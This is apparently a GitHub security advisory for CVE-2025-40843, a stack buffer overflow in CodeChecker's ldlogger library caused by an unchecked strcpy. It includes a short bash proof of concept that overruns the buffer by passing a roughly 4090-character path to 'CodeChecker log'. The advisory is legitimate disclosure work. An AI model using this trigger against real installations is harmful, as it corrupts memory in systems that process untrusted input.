# [M] CodeChecker has a buffer overflow in the log command

## Summary
Severity: Medium
Advisory: GHSA-5xf2-f6ch-6p8r
CVE: CVE-2025-40843
CWE: CWE-121
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L (CVSS_V3)
Published: 2025-09-22
Source: https://github.com/advisories/GHSA-5xf2-f6ch-6p8r
Type: github-advisory

## Affected
- PyPI: `codechecker` — affected >=0 <6.26.2

## Details
### Summary
CodeChecker versions up to 6.26.1 contain a buffer overflow vulnerability in the internal `ldlogger` library, which is executed by the `CodeChecker log` command.

### Details
Unsafe usage of `strcpy()` function in the internal `ldlogger` library allows attackers to trigger a buffer overflow by supplying crafted inputs from the command line. Specifically, the destination buffer is stack-allocated with a fixed size of 4096 bytes, while `strcpy()` is called without any length checks, enabling an attacker to overrun the buffer.

### PoC
Example script is included below to illustrate how this vulnerability can be exploited.
```bash
#!/bin/bash

export CC_LOGGER_DEF_DIRS=1; 
payload=''; for i in $(seq 1 4090); do payload+='A'; done

CodeChecker log -b "/very/long/path/to/$payload/gcc a.c" -o compilation.json
```

### Impact
Any environment where the vulnerable `CodeChecker log` command is executed with untrusted user input is affected by this vulnerability.

## References
- https://github.com/Ericsson/codechecker/security/advisories/GHSA-5xf2-f6ch-6p8r
- https://nvd.nist.gov/vuln/detail/CVE-2025-40843
- https://github.com/Ericsson/codechecker/commit/4122eb1b43d00c880e4f0747d2ca0a674feb7a50
- https://github.com/Ericsson/codechecker
- https://github.com/pypa/advisory-database/tree/main/vulns/codechecker/PYSEC-2025-100.yaml
